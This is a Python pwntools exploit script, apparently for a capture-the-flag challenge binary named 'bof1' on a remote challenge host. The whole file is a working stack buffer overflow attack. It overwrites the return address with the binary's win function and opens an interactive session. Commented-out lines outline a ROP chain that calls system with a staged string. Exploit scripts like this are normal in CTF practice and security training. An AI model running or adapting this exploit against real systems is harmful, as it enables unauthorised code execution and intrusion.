#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=freefall.chall.winja.site' '--port=18967' ./bof1
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF("./bof1")
context.terminal = ["tilix", "-a", "session-add-right", "-e"]

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or "freefall.chall.winja.site"
port = int(args.PORT or 18967)


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

pop_rdi = 0x0000000040124B
bss = 0x4033B0 + 0x100

io.recv()
io.sendline(b"A" * 40 + p64(exe.sym.win))
# print(io.recv())
# io.sendline(b"/bin/lssh\x00")
# io.recv()
# io.sendline(b"A" * 40 + p64(pop_rdi) + p64(bss) + p64(exe.sym.system))
# io.recv()

io.interactive()
